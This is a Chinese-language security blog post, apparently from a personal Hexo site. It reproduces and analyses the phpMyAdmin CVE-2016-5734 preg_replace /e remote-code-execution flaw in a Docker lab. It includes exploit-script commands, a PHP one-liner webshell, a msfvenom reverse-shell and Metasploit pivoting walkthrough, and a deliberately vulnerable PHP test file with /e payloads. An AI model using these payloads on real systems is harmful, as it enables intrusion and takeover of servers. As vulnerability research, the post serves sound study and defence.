@@ -1,0 +1,236 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>【漏洞分析】CVE-2016-5734 - phpmyadmin远程代码执行 | Sma11New</title><meta name="keywords" content="CVE-2016-5734,phpmyadmin远程代码执行"><meta name="author" content="Sma11New"><meta name="copyright" content="Sma11New"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="0x00 漏洞复现Docker拉取镜像，创建靶场环境，Kali上有利用脚本，直接搜索即可： 使用方法在脚本中有写，以下命令即可利用漏洞远程执行命令： python3 40185.py -u root -p root http:&#x2F;&#x2F;192.168.11.12:8080&#x2F; -c &quot;system(&#39;whoami &amp; uname -a&#39;);&quot;  其中-c 表示执">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【漏洞分析】CVE-2016-5734 - phpmyadmin远程代码执行">
+<meta property="og:url" content="https://blog.sma11new.com/post/20201052133.html">
+<meta property="og:site_name" content="Sma11New">
+<meta property="og:description" content="0x00 漏洞复现Docker拉取镜像，创建靶场环境，Kali上有利用脚本，直接搜索即可： 使用方法在脚本中有写，以下命令即可利用漏洞远程执行命令： python3 40185.py -u root -p root http:&#x2F;&#x2F;192.168.11.12:8080&#x2F; -c &quot;system(&#39;whoami &amp; uname -a&#39;);&quot;  其中-c 表示执">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
+<meta property="article:published_time" content="2020-10-05T13:33:40.000Z">
+<meta property="article:modified_time" content="2020-10-05T13:37:40.000Z">
+<meta property="article:author" content="Sma11New">
+<meta property="article:tag" content="CVE-2016-5734">
+<meta property="article:tag" content="phpmyadmin远程代码执行">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/XiaoXin.png"><link rel="canonical" href="https://blog.sma11new.com/post/20201052133"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"top-right"},
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: undefined,
+  isToc: true,
+  postUpdate: '2020-10-05 21:37:40'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    })(window)</script><meta name="generator" content="Hexo 5.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/XiaoXin.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Sma11New</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">【漏洞分析】CVE-2016-5734 - phpmyadmin远程代码执行</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-10-05T13:33:40.000Z" title="发表于 2020-10-05 21:33:40">2020-10-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-10-05T13:37:40.000Z" title="更新于 2020-10-05 21:37:40">2020-10-05</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="0x00-漏洞复现"><a href="#0x00-漏洞复现" class="headerlink" title="0x00 漏洞复现"></a>0x00 漏洞复现</h2><p>Docker拉取镜像，创建靶场环境，Kali上有利用脚本，直接搜索即可：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830647.png" alt="image2.png"></p>
+<p>使用方法在脚本中有写，以下命令即可利用漏洞远程执行命令：</p>
+<pre><code>python3 40185.py -u root -p root http://192.168.11.12:8080/ -c &quot;system(&#39;whoami &amp; uname -a&#39;);&quot;
+</code></pre>
+<p>其中-c 表示执行的php代码，此处利用php的system函数执行系统命令<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830669.png" alt="image3.png"></p>
+<p>可以创建php木马文件并写入内容，以phpinfo为例，此时-c参数需要利用**file_put_contents()**函数来写入文件： <code>&quot;file_put_contents(&#39;info.php&#39;,&#39;&lt;?php phpinfo();?&gt;&#39;);&quot;</code></p>
+<p>成功创建并访问并解析<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830727.png" alt="image5.png"></p>
+<p>写入一句话木马（$符号需要加反斜杠转义）：</p>
+<pre><code>python3 40185.py -u root -p root http://192.168.11.12:8080/ -c &quot;file_put_contents(&#39;shell.php&#39;,&#39;&lt;?php @eval(\$_POST[cmd]);?&gt;&#39;);&quot;
+</code></pre>
+<p>蚁剑连接（需要选编码方式，default会返回空）<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830750.png" alt="image6.png"></p>
+<p>msfvenom生成二进制木马，利用蚁剑上传到目标主机，虚拟终端操作木马文件，赋予其执行权限<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830756.png" alt="image7.png"></p>
+<p>Kali上监听4444端口，使用蚁剑在目标主机上执行木马文件，即可建立连接<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830762.png" alt="image8.png"></p>
+<p>继续进行简单的内网渗透</p>
+<p>查看内网网段信息：<strong>run get_local_subnets</strong><br>为目标主机添加路由：<strong>run autoroute -s 172.24.0.0/24</strong><br>查看路由表：<strong>run autoroute -p</strong><br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830777.png" alt="image9.png"></p>
+<p>background将会话后置，使用mysql扫描模块进行扫描，成功发现内网mysql服务主机</p>
+<pre><code>background
+use auxiliary/scanner/mysql/mysql_login
+set rhosts 172.24.0.1/24
+</code></pre>
+<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830796.png" alt="image10.png"></p>
+<p>可设置用户名密码对其进行爆破，也可以利用其他模块对内网进行探测攻击。</p>
+<p> </p>
+<h2 id="0x01-原理分析"><a href="#0x01-原理分析" class="headerlink" title="0x01 原理分析"></a>0x01 原理分析</h2><p>参考网上师傅们的文章，得知漏洞出自/libraries/TableSearch.class.php文件，发生在第1388行_getRegexReplaceRows()函数里的preg_replace()正则替换函数处，preg_replace()函数的三个参数中两个可控，一个简介可控，因此只要构造相应的数据即可触发RCE</p>
+<p>/libraries/TableSearch.class.php文件的_getRegexReplaceRows()函数如下：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830876.png" alt="image11.png"></p>
+<p>需要构造payload就需要对find、replaceWith、row[0]三个参数进行溯源分析，搜索_getRegexReplaceRows()函数，在第1430行发现在getReplacePreview()函数内部进行了调用，依然只是单纯的传参，继续溯源getReplacePreview()函数<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830883.png" alt="image12.png"></p>
+<p>在tbl_find_replace.php文件中发现调用了getReplacePreview()函数，且使用POST方式接受四个参数，包括前边preg_replace()函数的find和replace两个参数，即第1、2参数<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830889.png" alt="image13.png"></p>
+<p>此时已知preg_replace的前两个参数可控，但是要执行命令的条件是需要在第三个参数中匹配到第一个参数的内容，所以还需要对第三个参数进行溯源</p>
+<p>回到/libraries/TableSearch.class.php文件的_getRegexReplaceRows()函数处，preg_replace()函数第三个参数是row[0]，表示该参数是数据库查找结果result的第一行，上边也写出了拼接的查询语句<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830927.png" alt="image14.png"></p>
+<p>其中PMA_Util类在/libraries/Util.class.php类文件中进行了定义，其内部方法基本就是对原始数据做安全处理，如敏感字符的替换、编码、删除等操作，截取其中的一个sqlAddSlashes()函数作为示例：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830943.png" alt="image15.png"></p>
+<p>由于要构造payload的地方并不是SQL查询参数处，所以PMA_Util类的过滤操作可以略过，因此该SQL查询语句可以理解为：</p>
+<pre><code>SELECT $columnname ,1,cont(*) FROM database.table_name WHERE $columnname RLIKE ‘$find’ COLLATE $charset_bin GROUP BY $columnname ORDER BY $column ASC;
+</code></pre>
+<p>其中有两个查询参数：$this-&gt;_db、$this-&gt;_table是当前类的两个成员变量：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830965.png" alt="image16.png"></p>
+<p>对其溯源，最终在当前类的构造函数__construct()中发现了定义，是初始化时接收的参数，所以就需要继续对当前类的实例化进行溯源，找到传入的参数<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830977.png" alt="image17.png"></p>
+<p>已知当前类是PMA_TableSearch<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830984.png" alt="image18.png"></p>
+<p>对当前类的实例化进行溯源，最终在漏洞发生处，即tbl_find_replace.php文件中发现了引用，但是依然是直接传入参数：$db, $table，因此需要对这两个参数继续溯源<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830996.png" alt="image19.png"></p>
+<p>发现上图中，tbl_find_replace.php文件除了包含libraries/TableSearch.class.php文件外，还包含了libraries/common.inc.php文件，因此直接在libraries/common.inc.php文件中搜索定义的全局变量，最终在第525和531行找到<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601831011.png" alt="image20.png"></p>
+<p>而且在下面的代码中发现，db和table是通过REQUEST方式从表单接收来的，其中db是数据库名，table是表名，然后对其进行查询操作。</p>
+<p>至此，数据溯源完毕，整体链如下：</p>
+<ul>
+<li>REQUEST接收数据库名db和表名table，对其进行查询操作；</li>
+<li>将查询结果第一行的值row[0]赋值给preg_replace()函数第三个参数；</li>
+<li>通过POST方式接收find和replaceWith参数，分别赋值给preg_replace()的第一、二个参数；</li>
+<li>由于第一二个参数可控，因此只要让数据库查询结果的第一行中是已知的（因为要匹配到才能触发/e执行php语句），或是可控的，即可构造payload进行代码执行，甚至RCE。</li>
+</ul>
+<p>该文件本来想要实现的功能应该是replace即修改操作，但是忽略了preg_replace()函数的/e模式，且参数可控，未做安全校验。</p>
+<h2 id="0x02-POC-EXP分析"><a href="#0x02-POC-EXP分析" class="headerlink" title="0x02 POC/EXP分析"></a>0x02 POC/EXP分析</h2><p>已知原理，现在分析一下kali中给出的POC，其实已经是EXP了，因为可以直接执行任意命令。</p>
+<p>首先判断是否指定数据库，没有指定的话就默认选择test库，然后创建prgpwn表，再创建一个first字段，并写入内容<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601831065.png" alt="image21.png"></p>
+<p>写入的内容是经过UNHEX()16进制转字符串后的内容：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601831070.png" alt="image22.png"></p>
+<p>可以在数据库中查看EXP执行结果，成功创建相关内容：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601831075.png" alt="image23.png"></p>
+<p>完成后，再对find和replaceWith参数进行可控赋值，find传入0/e\0，\0用于截断源码中find后边的反斜杠，replaceWith就可以传入payload了，即要执行的php代码<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601831080.png" alt="image24.png"></p>
+<p>此时因为db和table指定的查询结果就是刚才写入的内容，再与传入的find成功匹配，加上/e模式，所以可以将replaceWith内容作为php代码执行，当传入执行的php代码为 system()函数时，即可进行RCE。</p>
+<h2 id="0x03-preg-replace-函数分析"><a href="#0x03-preg-replace-函数分析" class="headerlink" title="0x03 preg_replace()函数分析"></a>0x03 preg_replace()函数分析</h2><p>preg_replace()函数用于正则替换，当模式为e时会将替换的字符串作为php代码执行，当我复现时发现，preg_replace()函数在php7中已经不再支持了，使用preg_replace_callback()函数作为替代方案<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601831110.png" alt="image25.png"></p>
+<p>而且在php5.5.38和php5.6中也给出了替代提示，但是还可以正常使用；在php5.4及之前的版本都是可以的，且没有任何提示。</p>
+<p>为了方便测试，本地使用php5.3.29作为测试环境，编写以下测试代码：</p>
+<pre><code>&lt;?php
+
+// $a = &quot;/&quot; . $_POST[&quot;a&quot;] . &quot;/&quot;;
+$a = $_POST[&quot;a&quot;];
+$b = $_POST[&quot;b&quot;];
+$c = $_POST[&quot;c&quot;];
+
+echo &quot;a : &quot; . $a;
+var_dump($a);
+echo &quot;&lt;br/&gt; b : &quot; . $b;
+var_dump($b);
+echo &quot;&lt;br/&gt; c : &quot; . $c;
+var_dump($c);
+
+if (isset($a) &amp;&amp; isset($b) &amp;&amp; isset($c))&#123;
+    preg_replace($a, $b, $c);
+&#125;else&#123;
+    echo &quot;&lt;br/&gt; ERROR: Please Input Message&quot;;
+&#125;
+
+?&gt;
+</code></pre>
+<p>简单实现了一个POST传入三个参数a、b、c，将其传入preg_replace()函数进行正则替代。</p>
+<p>首先传入正常的数据：a=/[1-9]/&amp;b=O&amp;c=a1b2c3d4<br>作用是在将c中所有的1-9的数字替换为O<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601831146.png" alt="image26.png"></p>
+<p>使用/e命令执行模式，传入以下数据：a=/0/e&amp;b=phpinfo()&amp;c=/0/e<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601831159.png" alt="image27.png"></p>
+<p>也可以传入以下参数：**<code>a=/(.)/e&amp;b=phpinfo()&amp;c=everything</code><strong>，其中</strong><code>/(.)/</code>**表示匹配第一个字符，所以待匹配的字符串是任何数据都行。</p>
+<p>也可以传入以下参数：**<code>a=/(.*)/e&amp;b=phpinfo()&amp;c=everything</code><strong>，其中</strong><code>/(.*)/</code>**表示匹配所有，所以待匹配的字符串是任何数据都行。</p>
+<p>也可以传入以下参数：**<code>a=/(.*)/e&amp;b=\1&amp;c=phpinfo()</code><strong>，其中</strong><code>/(.*)/</code><strong>表示匹配所有字符，而\1表示其本身，也就是要执行的php代码就是</strong><code>/(.*)/</code>**匹配的结果，即待匹配字符串的全部：phpinfo()<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601831170.png" alt="image28.png"></p>
+<p>当传入system函数时，就可以RCE了。</p>
+<p>最后，还有一个截断的问题，在EXP中用的是**<code>\0</code><strong>截断，但是在我测试中发现，单纯的</strong><code>\0</code>**并不能进行截断，很奇怪，反而是%00可以在php5的较低版本中进行截断，并触发命令执行。</p>
+<p>参考漏洞中的情况，我们给第一个参数，即a两边加上 / ，如下：</p>
+<pre><code>$a = &quot;/&quot; . $_POST[&quot;a&quot;] . &quot;/&quot;;
+$b = $_POST[&quot;b&quot;];
+$c = $_POST[&quot;c&quot;];
+</code></pre>
+<p>使用的php版本是 <strong>php5.3.26</strong>，此时可以利用%00截断并触发代码执行：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/06/1601957543.png" alt="2020-10-06_12-10-35.png"></p>
+<p>php &lt; 5.3.4存在%00截断是已知的，但是**<code>\0</code>**无法截断未能理解，希望哪位师傅知道缘由的可以告知我，感谢。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Sma11New</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://blog.sma11new.com/post/20201052133.html">https://blog.sma11new.com/post/20201052133.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.sma11new.com" target="_blank">Sma11New</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CVE-2016-5734/">CVE-2016-5734</a><a class="post-meta__tags" href="/tags/phpmyadmin%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">phpmyadmin远程代码执行</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/202010282133.html"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Python Flask 服务端模板注入(SSTI)</div></div></a></div><div class="next-post pull-right"><a href="/post/20200972133.html"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">【XCTF】 Web进阶区 WriteUp 汇总</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/XiaoXin.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Sma11New</div><div class="author-info__description">You can't have national security without cybersecurity</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Sma11New"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Sma11New" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://blog.csdn.net/qq_43968080" target="_blank" title="CSDN"><i class="fab fa-creative-commons"></i></a><a class="social-icon" href="mailto:Sma11New@163.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my new blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">0x00 漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-text">0x01 原理分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-POC-EXP%E5%88%86%E6%9E%90"><span class="toc-text">0x02 POC&#x2F;EXP分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-preg-replace-%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90"><span class="toc-text">0x03 preg_replace()函数分析</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/post/20210152133.html" title="解决Python Class中进程池Pool对象无法作为类属性进行传递问题"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="解决Python Class中进程池Pool对象无法作为类属性进行传递问题"/></a><div class="content"><a class="title" href="/post/20210152133.html" title="解决Python Class中进程池Pool对象无法作为类属性进行传递问题">解决Python Class中进程池Pool对象无法作为类属性进行传递问题</a><time datetime="2021-01-05T13:33:40.000Z" title="发表于 2021-01-05 21:33:40">2021-01-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/20201222133.html" title="Windows和Linux上socket的终止问题（time_wait）"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Windows和Linux上socket的终止问题（time_wait）"/></a><div class="content"><a class="title" href="/post/20201222133.html" title="Windows和Linux上socket的终止问题（time_wait）">Windows和Linux上socket的终止问题（time_wait）</a><time datetime="2020-12-02T13:33:40.000Z" title="发表于 2020-12-02 21:33:40">2020-12-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/202010282133.html" title="Python Flask 服务端模板注入(SSTI)"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Python Flask 服务端模板注入(SSTI)"/></a><div class="content"><a class="title" href="/post/202010282133.html" title="Python Flask 服务端模板注入(SSTI)">Python Flask 服务端模板注入(SSTI)</a><time datetime="2020-10-28T13:33:40.000Z" title="发表于 2020-10-28 21:33:40">2020-10-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/20201052133.html" title="【漏洞分析】CVE-2016-5734 - phpmyadmin远程代码执行"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【漏洞分析】CVE-2016-5734 - phpmyadmin远程代码执行"/></a><div class="content"><a class="title" href="/post/20201052133.html" title="【漏洞分析】CVE-2016-5734 - phpmyadmin远程代码执行">【漏洞分析】CVE-2016-5734 - phpmyadmin远程代码执行</a><time datetime="2020-10-05T13:33:40.000Z" title="发表于 2020-10-05 21:33:40">2020-10-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/20200972133.html" title="【XCTF】 Web进阶区 WriteUp 汇总"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【XCTF】 Web进阶区 WriteUp 汇总"/></a><div class="content"><a class="title" href="/post/20200972133.html" title="【XCTF】 Web进阶区 WriteUp 汇总">【XCTF】 Web进阶区 WriteUp 汇总</a><time datetime="2020-09-07T13:33:40.000Z" title="发表于 2020-09-07 21:33:40">2020-09-07</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Sma11New</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" 